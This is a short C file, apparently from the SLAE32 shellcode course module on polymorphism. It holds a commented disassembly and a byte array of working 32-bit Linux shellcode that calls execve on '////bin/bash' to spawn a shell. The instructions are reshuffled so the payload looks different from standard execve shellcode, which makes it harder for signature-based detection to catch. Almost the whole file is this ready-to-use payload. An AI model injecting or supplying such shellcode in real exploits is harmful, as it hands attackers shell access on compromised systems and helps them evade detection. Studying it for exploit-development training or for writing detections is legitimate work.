/*
Following video: Module 2-12: EXECVE polymorphism
Using code from NASM\2-12

Reference NASM file for even more ways to obfuscate instructions

    /mnt/git/NASM/SLAE32/2-12_Polymorphism/execve-polymorphism:     file format elf32-i386

    Disassembly of section .text:

    08049000 <_start>:
     8049000:       31 c0                   xor    eax,eax
     8049002:       50                      push   eax
     8049003:       c7 44 24 fc 62 61       mov    DWORD PTR [esp-0x4],0x68736162
     8049009:       73 68 
     804900b:       c7 44 24 f8 62 69       mov    DWORD PTR [esp-0x8],0x2f6e6962
     8049011:       6e 2f 
     8049013:       c7 44 24 f4 2f 2f       mov    DWORD PTR [esp-0xc],0x2f2f2f2f
     8049019:       2f 2f 
     804901b:       83 ec 0c                sub    esp,0xc
     804901e:       89 e3                   mov    ebx,esp
     8049020:       50                      push   eax
     8049021:       89 e2                   mov    edx,esp
     8049023:       53                      push   ebx
     8049024:       89 e1                   mov    ecx,esp
     8049026:       b0 0b                   mov    al,0xb
     8049028:       cd 80                   int    0x80
*/

unsigned char shellcode[] = {
"\x31\xc0\x50\xc7\x44\x24\xfc\x62\x61\x73\x68\xc7\x44\x24\xf8\x62"
"\x69\x6e\x2f\xc7\x44\x24\xf4\x2f\x2f\x2f\x2f\x83\xec\x0c\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
};

unsigned int shellcode_len = sizeof(shellcode)-1;